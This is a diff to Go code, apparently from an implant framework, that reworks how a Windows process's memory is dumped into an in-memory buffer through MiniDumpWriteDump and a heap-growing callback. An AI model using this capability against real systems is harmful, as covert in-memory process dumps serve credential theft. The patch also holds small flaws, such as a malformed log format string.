@@ -65,7 +65,6 @@ const (
 	S_OK                   = 0
 	TRUE                   = 1
 	FALSE                  = 0
-	DefaultHeapSize        = 60 * 1024 * 1024
 	IncrementSize          = 5 * 1024 * 1024
 	MiniDumpWithFullMemory = 0x00000002
 )
@@ -74,6 +73,10 @@ var bytesRead uint32 = 0
 
 type WindowsDump struct {
 	data []byte
+}
+
+type outDump struct {
+	outPtr uintptr
 }
 
 func (d *WindowsDump) Data() []byte {
@@ -103,27 +106,8 @@ func dumpProcess(pid int32) (ProcessDump, error) {
 		return res, err
 	}
 
-	flags := uint32(syscalls.PSS_CAPTURE_VA_CLONE |
-		syscalls.PSS_CAPTURE_HANDLES |
-		syscalls.PSS_CAPTURE_HANDLE_NAME_INFORMATION |
-		syscalls.PSS_CAPTURE_HANDLE_BASIC_INFORMATION |
-		syscalls.PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION |
-		syscalls.PSS_CAPTURE_HANDLE_TRACE |
-		syscalls.PSS_CAPTURE_THREADS |
-		syscalls.PSS_CAPTURE_THREAD_CONTEXT |
-		syscalls.PSS_CAPTURE_THREAD_CONTEXT_EXTENDED |
-		syscalls.PSS_CREATE_BREAKAWAY |
-		syscalls.PSS_CREATE_BREAKAWAY_OPTIONAL |
-		syscalls.PSS_CREATE_USE_VM_ALLOCATIONS |
-		syscalls.PSS_CREATE_RELEASE_SECTION)
-	var snapshotHandle windows.Handle
-	err = syscalls.PssCaptureSnapshot(hProc, flags, syscalls.CONTEXT_ALL, &snapshotHandle)
-	if err != nil {
-		return res, err
-	}
-
 	if hProc != 0 {
-		return minidump(uint32(pid), snapshotHandle)
+		return minidump(uint32(pid), lpTargetHandle)
 	}
 	return res, fmt.Errorf("{{if .Config.Debug}}Could not dump process memory{{end}}")
 }
@@ -147,15 +131,31 @@ func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 	if err != nil {
 		return dump, err
 	}
-	heapSize := DefaultHeapSize
+
+	procMemCounters := syscalls.ProcessMemoryCounters{}
+	sizeOfMemCounters := uint32(unsafe.Sizeof(procMemCounters))
+	err = syscalls.GetProcessMemoryInfo(proc, &procMemCounters, sizeOfMemCounters)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("GetProcessMemoryInfo failed: %s\n", err)
+		// {{end}}
+		return dump, err
+	}
+
+	heapSize := procMemCounters.WorkingSetSize + IncrementSize
+
 	dumpBuffer, err := syscalls.HeapAlloc(heapHandle, 0x00000008, uintptr(heapSize))
 	if err != nil {
 		return dump, err
 	}
 
+	outData := outDump{
+		outPtr: dumpBuffer,
+	}
+
 	callbackInfo := MiniDumpCallbackInformation{
 		CallbackRoutine: windows.NewCallback(minidumpCallback),
-		CallbackParam:   dumpBuffer,
+		CallbackParam:   uintptr(unsafe.Pointer(&outData)),
 	}
 
 	err = syscalls.MiniDumpWriteDump(
@@ -176,7 +176,14 @@ func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 	}
 	outBuff := make([]byte, bytesRead)
 	outBuffAddr := uintptr(unsafe.Pointer(&outBuff[0]))
-	syscalls.RtlCopyMemory(outBuffAddr, dumpBuffer, bytesRead)
+	syscalls.RtlCopyMemory(outBuffAddr, outData.outPtr, bytesRead)
+	err = syscalls.HeapFree(heapHandle, 0, outData.outPtr)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("HeapFree failed: \n", err)
+		// {{end}}
+		return dump, err
+	}
 	dump.data = outBuff
 	return dump, nil
 }
@@ -263,6 +270,7 @@ func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackO
 		callbackOutput.Status = S_FALSE
 	case IoWriteAllCallback:
 		callbackOutput.Status = S_OK
+		outData := (*outDump)(unsafe.Pointer(callbackParam))
 		procHeap, err := syscalls.GetProcessHeap()
 		if err != nil {
 			// {{if .Config.Debug}}
@@ -270,7 +278,7 @@ func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackO
 			// {{end}}
 			return FALSE
 		}
-		currentBuffSize, err := syscalls.HeapSize(procHeap, 0, callbackParam)
+		currentBuffSize, err := syscalls.HeapSize(procHeap, 0, outData.outPtr)
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("minidumpCallback HeapSize failed: %s\n", err.Error())
@@ -282,8 +290,10 @@ func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackO
 			increasedSize := IncrementSize
 			if bytesAndOffset <= uint64(currentBuffSize*2) {
 				increasedSize = int(currentBuffSize) * 2
+			} else {
+				increasedSize += int(bytesAndOffset)
 			}
-			callbackParam, err = syscalls.HeapReAlloc(procHeap, 0, callbackParam, uintptr(increasedSize))
+			outData.outPtr, err = syscalls.HeapReAlloc(procHeap, 0, outData.outPtr, uintptr(increasedSize))
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("minidumpCallback HeapReAlloc failed: %s\n", err.Error())
@@ -291,7 +301,7 @@ func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackO
 				return FALSE
 			}
 		}
-		destination := callbackParam + uintptr(callbackInput.Io.Offset)
+		destination := outData.outPtr + uintptr(callbackInput.Io.Offset)
 		syscalls.RtlCopyMemory(destination, callbackInput.Io.Buffer, callbackInput.Io.BufferBytes)
 		bytesRead += callbackInput.Io.BufferBytes
 	case IoFinishCallback:
